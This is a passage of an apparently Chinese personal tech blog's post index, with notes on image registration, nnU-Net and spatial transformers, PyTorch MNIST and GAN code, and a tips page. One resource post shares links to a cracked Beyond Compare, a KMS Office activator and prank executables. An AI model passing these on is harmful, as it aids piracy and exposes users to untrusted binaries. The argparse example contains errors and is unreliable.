$c$ 个通道的坐标 $(n,m)$ 处的像素值；H 和 W 分别为输入特征图的高和宽。两个 $\sum$ 实际上只筛出了四个邻近插值点，虽然写法简洁，但白循环很多，所以源码中选择了直接算4个点，而不是用循环筛。 为了让上述公式可微，在论文中还定义了该公式的导数，这里就不详细介绍了。 以上部分是从他人的博客中看到的，对于那个优雅的插值公式不是很懂。 上图中输出特征图 V 对应的网格是一个规范网格，输入特征图 U 对应的网格是规范网格经过仿射变化后的一个扭曲变形的网格。定位网络的目的是得到规范网格和扭曲网格之间的对应关系，网格生成器的目的就是根据规整网格得到扭曲网格，采样器的目的是根据以上信息由输入特征图 U 得到输出特征图 V。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[基于深度学习的医学图像配准笔记]]></title>
    <url>%2F2020%2F02%2F23%2FMIR%2F</url>
    <content type="text"><![CDATA[本文是基于深度学习的医学图像配准相关知识的笔记，不设计到传统的方法，也不涉及具体模型。 一、简介在对同一物体进行医学成像时，由于设备差异、成像角度差异等因素，所以图像可能只能反应物体某个方面的特征。比如，MRI 对软组织成像效果较好，而 CT 对骨骼等成像效果较好。如果想结合两张不同的医学图像的信息进行诊断，就需要丰富的经验。也可以让其中一张图片做变换，使其与另一张图像对齐，然后在得到一张融合了两张图像特征的融合图像。 上述图像对齐的过程就是配准，在配准中保持不变的图像被称为参考图像（fixed image/reference image），而做变换的图像被称为浮动图像（moving image）。图像配准常为图像融合的一个预处理步骤。 具体地说，通过寻找一种空间变换把浮动图像映射到参考图像上，使得两图中对应于空间同一位置的点一一对应起来，从而达到信息融合的目的。 二、分类 上图是知乎博主白小鱼给出的根据不同分类方式的图像配准分类，下面稍微解释下里面的名词： 多视图配准：同一物体在同一场景不同视角下的图像配准； 多时相配准：同一物体在同一场景同视角不同时间的图像配准； 多模态配准：图像来自于多个成像设备，在 MRI 中 T1权重图像和 T2 权重图像也被看作是多模态的； 内部特征：从图像内部本身提取的信息； 外部特征：在医学图像中，通过在患者身上固定标记物或向体内注入显影物质以获得在图像上的确定的标记点。 近些年来，使用神经网络进行图像配准的文章可以大体分为两类： 利用深度学习网络估计两幅图像的相似性度量，驱动迭代优化； 直接利用深度回归网络预测转换参数。 前者只利用了深度学习进行相似性度量，仍然需要传统配准方法进行迭代优化，没有充分发挥深度学习的优势，花费时间长，难以实现实时配准。 当前用于配准的深度学习模型主要有四类： 卷积神经网络：最常见，最普遍； 循环神经网络：目前的研究较少； 强化学习：不懂，略； 生成对抗网络：目前已有一定数量的论文出现，可能是下一步的研究热点。 三、配准流程配准的方法是由特征空间（特征信息范围）、搜索空间（变换方式及范围）、搜索算法（变换方法及参数）和相似性测度四个不同方面的组合。配准的基本步骤如下： 特征的提取：选取合适的特征来确定图像的几何变换，如边界和特征点等； 确定几何变换：几何变换就是将一幅图像中的坐标点变换到另一幅图像的坐标系中。变换有线性和非线性变换两种。线性变换又包括刚体变换、仿射变换、投影变换等。刚体变换后后物体内部任意两点之间的距离不变，可分为旋转和平移两种； 寻优：通过调整变换的参数使得浮动图像和参考图像之间的相似度最优，从而求解出变换模型中的未知参数； 执行变换：将确定好的变换应用在浮动图像上。 四、评价指标目前没有一个绝对的金标准（gold standard）可以评估图像配准的质量，下面仅以医学图像为例，列举两种最经典的评估方法： 单模图像配准常使用相关系数（Correlation Coefficient, CC）来衡量； 多模图像配准常使用互信息（Mutual Information, MI）来衡量。 也常使用图像分割领域的 DICE 损失，熵相关系数（Entropy Corrleation Coefficient，ECC）等指标进行评估。 五、有监督配准图像配准根据使用的深度学习的种类划分，可以划分为基于监督学习的配准与基于非监督学习的配准两大类。 基于监督学习的配准，也就是在训练学习网络时，需要提供与配准对相对应的真实变形场（即Ground Truth）。标签的获取有两种方式： 利用传统的经典配准方法进行配准，得到的变形场作为标签； 对原始图像进行模拟变形，将原始图像作为参考图像，变形图像作为浮动图像，模拟变形场作为标签 。 训练时通常先以两幅图像对应坐标为中心点进行切块，将图像块输入深度学习网络，网络输出为图像块中心点对应的变形向量（Deformation Vector）。在测试阶段，对待配准图像对进行采样，输入网络，把预测的变形向量综合成变形场，再利用预测的变形场对移动图像进行插值，即得配准图像。 六、无监督配准基于非监督学习的配准方法就是在训练学习网络时，只需要提供配准对，不需要标签（即真实的变形场）。在训练时，基于非监督学习的配准将图像对输入网络，获得变形场，对浮动图像进行变形插值，即得配准图像。并利用变形后的图像与参考图像计算损失函数值，对其进行反向传播，不断优化，使得损失函数值最小。 关于输出，基于监督学习的配准方法往往输出的是变形向量，而基于非监督学习的方法输出的为变形图像。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[用pytorch实现在MNIST手写数字数据集上的分类任务]]></title>
    <url>%2F2020%2F02%2F21%2Fpytorch-example%2F</url>
    <content type="text"><![CDATA[本文是 pytorch 在 MNIST 数据集上实现手写数字识别的一个实例。 已经在代码中给出了较为详细的注释，所以直接看代码吧。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201# 本代码的作用是将MNIST手写数据集中手写体的数字0~9给正确的识别出来。'''pytorch进行神经网络训练的流程：一.首先定义神经网络模型 model=Net()二.定义优化器 optimizer = optim.SGD(model.parameters(), lr=0.01, momentum=0.5)三.训练阶段，循环每个epoch，对于一个epoch： 1.将模型设置为训练模式 model.train() 2.将训练数据分为batch_size大小的组，对每一组中所有的样本： 1).将梯度初始化为0 optimizer.zero_grad() 2).对这组样本进行训练，并得到输出 output=model(data) 3).根据预测输出和真实类别计算损失函数 loss=F.nll_loss(output,target) 4).反向传播，计算梯度 loss.backward() 5).更新模型参数 optimizer.step() 3.保存模型（可省略） torch.save(model,"mnist_torch.pkl")四.加载已训练好的模型（可省略）五.测试阶段，对于所有的测试样本： 1.将模型设置为评价模式 model.eval() 2.根据建好的模型对测试数据进行预测，得到预测结果 output=model(data) 3.计算损失函数 test_loss+=F.nll_loss(output,target).data 4.将概率最大的类别当作预测类别，并计算准确率 correct+=pred.eq(target.data).cpu().sum()上述第四大步的第4小步是当问题是分类问题时才有的上述中 model.train()和model.eval()的不同在于，model.eval()去除神经网络中的随机性，而model.train()则保留了神经网络中的随机性。这是因为神经网络中的某些操作（如dropout等），会存在一定的随机性（dropout会随机让神经网络中的节点失活），所以为了保证预测结果是可复现的，所以在测试阶段要设置为model.eval()。'''import osimport torchimport cv2 as cvimport torch.nn as nnimport torch.optim as optimimport torch.nn.functional as Ffrom keras.datasets import mnistfrom torch.autograd import Variableepochs = 5batch_size = 200# 以下函数是为了实现数据可视化的，可不必理解def save_as_jpg(train_x, train_y, test_x, test_y): # 将MNIST数据集中的图片保存为jpg格式，将标签保存到对应的txt文档中 flag=0 path = "./MNIST_JPG/train/images" if not os.path.exists(path): os.makedirs(path) flag=1 path = "./MNIST_JPG/train/labels" if not os.path.exists(path): os.makedirs(path) flag=1 if flag==1: for i in range(train_x.shape[0]): cv.imwrite("./MNIST_JPG/train/images/&#123;&#125;.jpg".format(i), train_x[i, :, :]) file_name = "./MNIST_JPG/train/labels/&#123;&#125;.txt".format(i) f = open(file_name, 'w') f.write(str(train_y[i])) f.close() flag=0 path = "./MNIST_JPG/test/images" if not os.path.exists(path): os.makedirs(path) flag=1 path = "./MNIST_JPG/test/labels" if not os.path.exists(path): os.makedirs(path) flag=1 if flag==1: for i in range(test_x.shape[0]): cv.imwrite("./MNIST_JPG/test/images/&#123;&#125;.jpg".format(i), test_x[i, :, :]) file_name = "./MNIST_JPG/test/labels/&#123;&#125;.txt".format(i) f = open(file_name, 'w') f.write(str(test_y[i])) f.close() print("\nSave as jpg has finished.")class Net(nn.Module): ''' Net是nn.Module的子类，继承了它的所有方法，包括__call__()方法和forward()方法， __call__()方法中会使用到前向转播函数forward()。 ''' def __init__(self): super(Net, self).__init__() # 对继承自父类的属性进行初始化 ''' torch.nn和torch.nn.functional的不同在于nn只是定义了各种操作而并没有运行， 而functional是运行各个操作。 ''' # 定义卷积操作 self.conv1 = nn.Conv2d(1, 10, kernel_size=5) self.conv2 = nn.Conv2d(10, 20, kernel_size=5) self.conv2_drop = nn.Dropout2d() # 定义随机失活操作 # 定义全连接操作 self.fc1 = nn.Linear(320, 60) self.fc2 = nn.Linear(60, 10) # 下面的写法和上面的是等价的 ''' self.layer1 = nn.Sequential( nn.Conv2d(1, 10, kernel_size=5), nn.MaxPool2d(2), nn.ReLU() ) self.layer2 = nn.Sequential( nn.Conv2d(10, 20, kernel_size=5), nn.MaxPool2d(2), nn.ReLU() ) self.layer3=nn.Sequential( nn.Linear(320, 60), nn.ReLU() ) ''' # 前向传播 def forward(self, x): layer1 = F.relu(F.max_pool2d(self.conv1(x), 2)) # 卷积+最大池化+relu激活函数 #layer1=F.relu(F.max_pool2d(F.conv2d(x,5),2)) layer2 = F.relu(F.max_pool2d(self.conv2_drop(self.conv2(layer1)), 2)) layer2 = layer2.view(-1, 320) layer3 = F.relu(self.fc1(layer2)) # 全连接+relu激活函数 # 可将以上四行代码换成封装好的以下四行代码，效果是相同的 #layer1=self.layer1(x) #layer2 = self.layer2(x) #layer2 = x.view(-1, 320) #layer3 = self.layer3(x) layer4 = self.fc2(F.dropout(layer3, training=self.training)) return F.log_softmax(layer4) # 用softmax进行分类# 模型的训练过程def train(model, epoch, train_x, train_y, num_samples, optimizer): num_batchs = int(num_samples / batch_size) model.train() # 将模型设置为训练模式 for batch in range(num_batchs): start, end = batch * batch_size, (batch + 1) * batch_size # 参数requires_grad=False的意思是不用求梯度 data, target = Variable(train_x[start:end], requires_grad=False), Variable(train_y[start:end], requires_grad=False) target = target.long() # 转换为长整形 optimizer.zero_grad() # 将梯度初始化为0，否则每个batch的梯度会累积 output = model(data) # 会调用__call__()函数，进一步调用forward()函数进行前向传播 print("target: ",target.shape) loss = F.nll_loss(output, target) # 计算损失函数 loss.backward() # 反向传播 optimizer.step() # 更新模型参数 if batch % 10 == 0: print("Train Epoch:&#123;&#125; [&#123;&#125;/&#123;&#125; (&#123;:.2f&#125;%)]\nLoss:&#123;:.6f&#125;".format(epoch, batch * len(data), num_samples, 100.0 * batch_size * batch / num_samples, loss.data)) torch.save(model, "mnist_torch.pkl") # 保存训练好的模型# 模型的测试过程def test(model): model.eval() # 将模型设置为评价模式 data, target = Variable(test_x), Variable(test_y) output = model(data) # 前向传播，得到每个图片的预测分类 target = target.long() test_loss = F.nll_loss(output, target).data # 计算损失函数 pred=torch.argmax(output.data,dim=1) # 求每个样本的最大值，即样本的预测类别 correct = pred.eq(target.data).cpu().sum() # 计算所有样本的正确率（正确分类个数/总个数），.cpu()表示用cpu进行计算 # test_loss/=len(test_x) #平均损失 print("\nTest set Average loss: &#123;:.4f&#125;, Accuracy: &#123;&#125;/&#123;&#125; (&#123;:.0f&#125;%)\n".format(test_loss, correct, len(test_x), 100.0 * correct / len(test_x)))if __name__ == "__main__": # train_x是图像，共6w张28*28大小的图像；train_y是图像的真实分类 (train_x, train_y), (test_x, test_y) = mnist.load_data() save_as_jpg(train_x, train_y, test_x, test_y) # 把MNIST数据集保存为图片和文档 # 将训练集和测试集转换为torch的张量 train_x = torch.Tensor(train_x) train_y = torch.Tensor(train_y) test_x = torch.Tensor(test_x) test_y = torch.Tensor(test_y) # 增加一个多余的维度 train_x.resize_(train_x.shape[0], 1, 28, 28) test_x.resize_(test_x.shape[0], 1, 28, 28) num_samples = train_x.shape[0] # 数据个数 model = Net() optimizer = optim.SGD(model.parameters(), lr=0.01, momentum=0.5) # 优化器 for epoch in range(1,epochs+1): train(model,epoch,train_x,train_y,num_samples,optimizer) #训练 model = torch.load("mnist_torch.pkl") # 加载已经保存的模型 test(model) # 在测试集上测试效果]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[基于生层对抗网络（GAN）在MNIST手写数字数据集上生成假图片（pytorch版）]]></title>
    <url>%2F2020%2F02%2F21%2FGAN-example%2F</url>
    <content type="text"><![CDATA[本文是 GAN 在 MNIST 数据集上生成假的手写数字图片的一个实例，具体是用 pytorch 实现的。 先来看下训练的结果，下面两张图中，上面的是真实手写数字图片，下面的是在训练了30个 epoch 之后 GAN 生成的假图片。整体来说，效果还是蛮不错的。 GAN 由一个生成器和一个对抗器组成，在该任务中，生成器的输入是一堆随机生成的噪音，其输出为生成的假图片，其目标是让生成的假图片尽可能的像真实图片；而判别器的输入是一张图片，其输出是这张图片是真实图片的概率。 在训练时，需要先训练判别器再训练生成器，如果判别器的好坏决定着生成器的效果。在生成器训练时，先将一堆噪音输入到生成器并得到假图片，然后再将假图片输入到判别器进行判别，然后将判别结果与真实标签（注意不是假标签，因为生成器的目标是尽可能的模拟真实图片）进行比对形成损失函数。判别器的训练分为两个部分，一是对真实图片进行判别，二是对假图片进行判别，得到的判别结果分别与真实标签和假标签对比形成真实图片的损失和假图片的损失，两者相加就是判别器的总损失。 这个代码有个蛋疼的地方是，如果用 keras 引入 MNIST 数据集，则在训练时损失函数会很快就趋近于 0 了，训练效果很差，而用 torchvision 时则没这个问题。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174import osimport cv2import torchimport torchvisionimport numpy as npimport torch.nn as nnimport torch.optim as optimimport torch.nn.functional as Ffrom torchvision import datasetsfrom keras.datasets import mnistfrom torchvision.utils import save_imagebatch_size = 100epoch_num = 30lr = 0.0002input_dim = 100class Generator(nn.Module): def __init__(self, input_dim): super(Generator, self).__init__() self.fc1 = nn.Linear(input_dim, 56 * 56) self.br = nn.Sequential( nn.BatchNorm2d(1), nn.ReLU(True) # inplace设为True，让操作在原地进行 ) self.conv1 = nn.Sequential( nn.Conv2d(1, 50, 3, stride=1, padding=1), nn.BatchNorm2d(50), nn.ReLU(True) ) self.conv2 = nn.Sequential( nn.Conv2d(50, 25, 3, stride=1, padding=1), nn.BatchNorm2d(25), nn.ReLU(True) ) self.conv3 = nn.Sequential( nn.Conv2d(25, 1, 2, stride=2), nn.Tanh() ) def forward(self, x): x = self.fc1(x) x = x.view(-1, 1, 56, 56) x = self.br(x) x = self.conv1(x) x = self.conv2(x) output = self.conv3(x) return outputclass Discriminator(nn.Module): def __init__(self): super(Discriminator, self).__init__() self.conv1 = nn.Sequential( nn.Conv2d(1, 32, 5, stride=1, padding=2), nn.LeakyReLU(0.2,True) ) self.pl1 = nn.AvgPool2d(2, stride=2) self.conv2 = nn.Sequential( nn.Conv2d(32, 64, 5, stride=1, padding=2), nn.LeakyReLU(0.2,True) ) self.pl2 = nn.AvgPool2d(2, stride=2) self.fc1 = nn.Sequential( nn.Linear(64 * 7 * 7, 1024), nn.LeakyReLU(0.2,True) ) self.fc2 = nn.Sequential( nn.Linear(1024, 1), nn.Sigmoid() ) def forward(self, x): x = self.conv1(x) x = self.pl1(x) x = self.conv2(x) x = self.pl2(x) x = x.view(x.shape[0], -1) x = self.fc1(x) output = self.fc2(x) return outputdef G_train(input_dim): G_optimizer.zero_grad() noise = torch.randn(batch_size, input_dim).to(device) real_label = torch.ones(batch_size).to(device) fake_img = G(noise) D_output = D(fake_img) G_loss = criterion(D_output, real_label) G_loss.backward() G_optimizer.step() return G_loss.data.item()def D_train(real_img, input_dim): D_optimizer.zero_grad() real_label = torch.ones(real_img.shape[0]).to(device) D_output = D(real_img) D_real_loss = criterion(D_output, real_label) noise = torch.randn(batch_size, input_dim, requires_grad=False).to(device) fake_label = torch.zeros(batch_size).to(device) fake_img = G(noise) D_output = D(fake_img) D_fake_loss = criterion(D_output, fake_label) D_loss = D_real_loss + D_fake_loss D_loss.backward() D_optimizer.step() return D_loss.data.item()def save_img(img, img_name): img = 0.5 * (img + 1) img = img.clamp(0, 1) save_image(img, "./imgs/" + img_name) # print("image has saved.")if __name__ == "__main__": if not os.path.exists("./checkpoint"): os.makedirs("./checkpoint") if not os.path.exists("./imgs"): os.makedirs("./imgs") device = torch.device('cuda' if torch.cuda.is_available() else 'cpu') # 加载数据 train_dataset = datasets.MNIST(root='./mnist_data/', train=True, transform=torchvision.transforms.ToTensor(), download=True) train_loader = torch.utils.data.DataLoader(dataset=train_dataset, batch_size=batch_size, shuffle=True) # 构建生成器和判别器网络 if os.path.exists('./checkpoint/Generator.pkl') and os.path.exists('./checkpoint/Discriminator.pkl'): G=torch.load("./checkpoint/Generator.pkl").to(device) D=torch.load("./checkpoint/Discriminator.pkl").to(device) else: G = Generator(input_dim).to(device) D = Discriminator().to(device) # 指明损失函数和优化器 criterion = nn.BCELoss() G_optimizer = optim.Adam(G.parameters(), lr=lr) D_optimizer = optim.Adam(D.parameters(), lr=lr) print("Training...........") for epoch in range(1, epoch_num + 1): print("epoch: ", epoch) for batch, (x, _) in enumerate(train_loader): # 对判别器和生成器分别进行训练，注意顺序不能反 D_loss=D_train(x.to(device), input_dim) G_loss=G_train(input_dim) #if batch % 20 == 0: print("[ %d / %d ] g_loss: %.6f d_loss: %.6f" % (batch, 600, float(G_loss), float(D_loss))) if batch % 50 == 0: fake_img = torch.randn(128, input_dim) fake_img = G(fake_img) save_img(fake_img, "img_" + str(epoch) + "_" + str(batch) + ".png") # 保存模型 torch.save(G, "./checkpoint/Generator.pkl") torch.save(D, "./checkpoint/Discriminator.pkl")]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[随笔-随时更新]]></title>
    <url>%2F2020%2F02%2F21%2Fnotes%2F</url>
    <content type="text"><![CDATA[本文是自己的一些随笔，记录一些比较关键的，以后可以用到的知识点。 python中使用参数1234567891011from argparse import ArgumentParserparser = ArgumentParser() # 创建一个解析对象# 参数一般包括：短参数、长参数、数据类型（type）、默认值（default）、帮助信息（help）、参数值范围（choices）、是否必须（require）、action。# action选项中常用的是 action="store_true"，它表示只要运行时该变量有传参就将该变量设为True# 具体例子如下parser.add_argument('-b','--batch_size', type=int, default=5, help="Batch size in training.", choices=[1,2,3,4,5], require=True, action='store_true') #添加命令行参数和选项parser.parse_args() # 进行解析batch_size=args.batch_sise# 若文件名为test.py，则在命令行中输入 test.py --help 即可查看所有支持的参数 python处理 json12345678910111213141516171819202122232425262728293031323334353637import json'''主要使用两个函数： json.dumps()：用于将python的数据类型转化为json中的字符串 json.loads()：用于将json中的字符串转化为python的数据类型''''''json.dumps(obj,sort_keys=False) # sort_keys参数可以用来决定转换后的json是否按key值排序 python 原始类型向 json 类型的转化对照表： python json -------------------------- dict object list, tuple array str, unicode string int, long, float number True true False false None null ''''''json.loads(obj) json 原始类型向 python 类型的转化对照表： json python ----------------------------- object dict array list string unicode number (int) int, long number (real) float true True false False null None ''' python中arg和*kwargs的区别这两个是python中的可变参数。*args 表示任意多个无名参数，它是一个tuple；**kwargs 表示任意多个关键字参数，它是一个dict。当 arg、args、*wkargs 同时使用时，必须按照该顺序，否则会报错。 1234567891011def foo(*args, **kwargs): print 'args = ', args print 'kwargs = ', kwargs print '---------------------------------------' return kwargs # 返回值是一个字典if __name__ == '__main__': foo(1,2,3,4) foo(a=1,b=2,c=3) foo(1,2,3,4, a=1,b=2,c=3) foo('a', 1, None, a=1, b='2', c=3) 以上代码的输出为： 123456789101112args = (1, 2, 3, 4) kwargs = &#123;&#125; --------------------------------------- args = () kwargs = &#123;'a': 1, 'c': 3, 'b': 2&#125; --------------------------------------- args = (1, 2, 3, 4) kwargs = &#123;'a': 1, 'c': 3, 'b': 2&#125; --------------------------------------- args = ('a', 1, None) kwargs = &#123;'a': 1, 'c': 3, 'b': '2'&#125; --------------------------------------- python中NiBabel模块的使用NiBabel模块可以对常见的医学和神经影像文件格式进行读写，比如.nii.gz格式的文件。 12345678910111213# 用pip install nibabel来安装import nibabel as nibimg = nib.load(file_name) #加载图像img.shape #图像形状print(img.affine) #把图像矩阵转换为RAS+坐标系的仿射变换矩阵print(img.header) #图像的头，包含很多信息print(img.header.get_data_shape()) #图像矩阵的shapeprint(img.header.get_data_dtype()) #图像矩阵的数据类型img.get_data() #获取图像数据img.affine.shape #仿射变换img.to_filename(save_path) #保存图像nib.save(img, save_path) #保存图像 python中的generatorgenerator是一个特殊的函数，它与普通函数相比有以下区别： generator函数包含一个以上的yield声明，用yield来返回值； generator函数被调用的时候，会返回一个iterator对象，但是函数并不会立即开始执行； __iter__()和__next__()方法被自动实现，所以可以使用next()函数对返回的此iterator对象进行迭代，也可直接使用for循环来迭代； 一旦一个generator 执行到yield语句，generator函数暂停，程序控制流被转移到调用方； 在对generator的连续调用之间，generator的本地变量和状态会被保存； 最终，generator函数终止，再调用generator会引发StopIteration异常； generator函数中也允许使用return，但是return 后不允许有返回值。return和yield的区别在于，return声明彻底结束一个函数，而yield声明是暂停函数，保存它的所有状态，并且后续被调用后会继续执行。 12L = [x * x for x in range(10)] #返回的是列表g = (x * x for x in range(10)) #返回的是generator TFRecords文件的读取和生成TFRecords是一种tensorflow的内定标准文件格式，其实质是二进制文件。TFRecords文件方便复制和移动，能够很好的利用内存，无需单独标记文件，适用于大量数据的顺序读取，是tensorflow“从文件里读取数据”的一种官方推荐方法。 1. TFRecords文件的生成12345678910111213141516171819#生成TFRecord Writer，path是输出的路径，options是文件保存的压缩格式，有三种可选：# 1. TFRecordCompressionType.ZLIB# 2. TFRecordCompressionType.GZIP# 3. TFRecordCompressionType.NONE# 默认最后一种，即不做任何压缩writer=tf.python_io.TFRecordWriter(path,options=None) # 要保存的数据按如下方式组织（由外到内）：最外层是features，一个features包含一个字典，字典的每个值是一个feature。feature将一个列表编码为特定的形式，列表类型通常有BytesList, FloatList, Int64List。feature = &#123; "width":tf.train.Feature(int64_list=tf.train.Int64List(value=[width])), "weights":tf.train.Feature(float_list=tf.train.FloatList(value=[weights])), "image_raw":tf.train.Feature(bytes_list=tf.train.BytesList(value=[image_raw]))&#125;features = tf.train.Features(feature=feature)# 使用tf.train.Example将features编码数据封装成特定的PB协议格式example = tf.train.Example(features=features)# 将example数据系列化为字符串，并将其写入协议缓冲区writer.write(example.SerializeToString())# 关闭TFRecords文件操作接口writer.close() 2. TFRecords文件的读取12345678910111213141516# 生成文件队列，file_list是包含多个精确到文件名路径的列表data_queue = tf.train.string_input_producer(file_list,shuffle=False) reader = tf.TFRecordReader() #生成TFRecord Reader_,serialized_example = reader.read(data_queue) # 读取TFRecord文件# 解析得到序列化的examplefeatures = tf.parse_single_example( serialized_example, features=&#123; "float_val":tf.FixedLenFeature([], tf.float), "width":tf.FixedLenFeature([], tf.int64), "height":tf.FixedLenFeature([], tf.int64), "image_raw":tf.FixedLenFeature([], tf.string) &#125;)# 得到的features是一个字典，通过指定的key来获取相应的数据即可，如果是图像的话，需要解码才能得到原始图片image=tf.decode_raw(features["image_raw"],tf.float32) python知识点 当有函数嵌套时，外层函数的返回值往往是内层函数，并且在内层函数只可以在外层函数里访问 通过 @property 装饰器，可以直接通过方法名来访问方法，不需要在方法名后添加一对“（）” 其他知识点 Dice 损失类似于交并比，有两个mask，记为X和Y，其Dice损失为$Dice=2\times\frac{X\cap Y}{|X|+|Y|}$ WinEdt 中 Tex 编译的快捷键为 ctrl+shift+P，当出现报错信息时 l.30 中字母 l 后面的即出错的行数，输入 e 可以定位到对应的行，输入 Enter 查看下一个错误信息，输入 s 忽略所有报错信息。 变形场（deformation field）是指能使流体在运动中发生形状变化，尤其是伸展（收缩）和切变的速度场。 用 nvidia-smi 命令查看显卡使用情况，watch -n 1 nvidia-smi动态查看显卡使用情况 ubuntu查看版本信息：lsb_release -a，查看 CUDA 版本 nvcc --version 或 cat /usr/local/cuda/version.txt linux 编辑环境变量 vi ~/.bashrc，使环境变量生效 source ~/.bashrc，查看环境变量中的 PATH 等 echo $PATH 远程连接服务器离线跑代码：首先用 sudo apt-get install screen 安装 screen用 screen -S screen名 创建一个 screen，然后运行程序即可，这样就可以关掉连接服务器的软件了。输入 screen -ls 即可查看现有的 screen，输入 screen -r 编号.screen名 就可以重新连接到 screen。当意外退出时，用screen -D -r 编号.screen名重新连接到screen。需要彻底关闭 screen 时可以使用 kill screen编号即可。 free -h查看linux系统内存大小 unzip 压缩文件名.zip在linux下解压.zip格式的压缩文件]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[资源免费共享-随时更新]]></title>
    <url>%2F2020%2F02%2F21%2Fresource%2F</url>
    <content type="text"><![CDATA[本文是介绍一些我个人觉得比较好用的软件、网站、电子书等资源，并给出了相应的下载链接。 一、实用/恶搞小程序 PDF 转 Word 工具 链接：https://pan.baidu.com/s/1lwX9iO4dCMJ5a7MuiaWJRw提取码：9ftz 生日礼物：通过弹窗、让电脑说话、放屁熊猫的方式送上生日祝福 链接：https://pan.baidu.com/s/1NEwZxFTHcQYRdjtJbaxElg提取码：47kz 删除重复照片 链接：https://pan.baidu.com/s/1MbVXvOybKsNlIe3j8H4J8w提取码：j6ax 恶搞程序：包括多个整人的小程序，除了“快捷方式.exe”会在桌面产生大量快捷方式外，其他不会有太大的影响 链接：https://pan.baidu.com/s/1JcVrh47k2DmujzjVnuFPBw提取码：ghj8 几何画板 链接：https://pan.baidu.com/s/1ntCgAmFlejAoxxmQI6aLvg提取码：8pg4 删除桌面快捷方式的箭头 链接：https://pan.baidu.com/s/1q-n3hieTvEhVOcvtGCZZ9Q提取码：ajjr Beyond Compare文本文档/文件夹对比软件破解版 链接：https://pan.baidu.com/s/12TML2XE6BNKmcHb-mwpF6Q提取码：2438 KMS Office 办公软件激活 链接：https://pan.baidu.com/s/1Zta_5CZL_alEF440GBR4nA提取码：f5lv 二、免费书籍 李航《统计学习方法》第二版 链接：https://pan.baidu.com/s/1pgxREjyz5KG8jlVdfdmHFQ提取码：2z43 OpenCV教程（Python版） 链接：https://pan.baidu.com/s/1174-BNzBiUU_uCjVPzDQKw提取码：6hjq PyTorch教程 链接：https://pan.baidu.com/s/1vt3M4HI5XWE4NuqjM9jFrg提取码：45iy 三、推荐软件及网站 Everything：以极快的速度搜索电脑中的文件 格式工厂：视频、音频、文档格式转换 Potplayer：windows上最好用的视频播放器，加速播放声音不失真 CrystalDiskMark硬盘测速：查看硬盘读写速度 IDM：不限速的下载器 硕鼠：主流视频网站视频免费下载器 www.tool.lu：有一个下载链接转换功能，当训练下不动的时候，可以查看其真是地址，用百度网盘的离线下载功能下载 mathpixs：截图将数学公式识别为Latex格式 鸠摩搜索（https://www.jiumodiary.com/）：PDF书籍搜索和下载 四、其他资源 ACM 模板和常用算法代码：自己刷题时整理的，不全 链接：https://pan.baidu.com/s/1qSaZMs2foKcsXg_JtxUVvw提取码：n950]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】基于U-Net的医学图像分割模型nnU-Net（no-new U-Net）]]></title>
    <url>%2F2020%2F02%2F21%2FnnU-Net%2F</url>
    <content type="text"><![CDATA[本文是 nnU-Net 论文的笔记，稍微做了整合了一下，可能有些地方有所遗漏，等以后看完代码之后再补充。 1. 摘要nnU-Net（no-new-Net）是基于 U-Net 的一种模型，它在达到很好的效果的同时还实现了自适应（self-adapting）的功能。在不同数据集（或不同的部位）的医学图像上进行分割时，往往需要具有不同结构的网络和不同的训练方案，自适应是指模型在对不同的数据集进行训练时，可以自动的调整 batch-size、patch-size 等，以达到很好的效果。 作者在一个医学图像分割十项全能比赛当中的 6 个数据集集中都取到了当时最好的结果，这个比赛一共 10 个数据集，它会给出 7 个数据集让你训练，然后在其他 3 个数据集上进行验证。 2. 方法2.1 网络结构作者以 U-Net 为基础，通过调整网络的结构后效果没有得到提升，所以作者转而关注非结构的部分。nnU-Net 可以根据给出的数据集自动的调整网络的设置。nnU-Net 相比于 U-Net，前者用 leaky ReLU 代替了 ReLU 做激活函数，用实例正则化（instance normalization）代替了批正则化（batch normalization）。 U-Net 采用编码器-解码器的结构，其中编码器部分可以聚合语义信息（semantic information），但是同时也会损失空间信息（spatial information），说人话就是编码器在提取图像特征的同时也使图像的分辨率降低了。但是语义信息和空间信息对于分割任务来说都是至关重要的，所以在解码器部分需要对空间信息进行恢复，具体的就是通过下层的语义信息，并结合利用跳跃连接得到的更高分辨率的特征图（即空间信息）来进行空间信息的恢复。 nnU-Net 由三种基础的 U-Net 网络组成，分别是 2D U-Net，3D U-Net 和 U-Net Cascade。其中，2D 和 3D U-Net 产生一个全像素的分割结果，U-Net Cascade 先产生一个低像素的分割结果，再对其进行微调。 直观来看，2D U-Net 在处理 3D 的医学图像时不是最优的，因为在 $z$ 轴上的信息没有得到充分的利用。但是也有证明显示 3D 分割方法在一些具有各向异性（不懂何为各向异性）的数据集上效果会变差。我们通常会选择 3D U-Net 来处理 3D 的医学图像，但这 3D 分割方法的一个缺点就是占用显存较大，当显存放不开一个 3D 图像时，可以将图像的 patch 作为输入，但这又限制了视野（field of view），不能充分的利用图像的上下文信息。为了解决 3D U-Net 带来的这种问题，所以使用了 U-Net Cascade 的方法，即先用一个 3D U-Net 处理下采样之后的图像（图像分辨率较低），然后输出分割结果，并将其上采样到原始大小，并作为附加的输入通道（和原始 3D 图像在通道上拼接）输入到第二个 3D U-Net 做基于 patch 的分割。 上图是 U-Net Cascade 的示意图，要注意每个不同标记所代表的意思，然后结合上一段的内容还是比较好理解的。 2.2 动态自适应网络的动态自适应简单来说就是根据数据集的不同自动的调整 batch size 和 patch size，当 patch size 大的时候 batch size 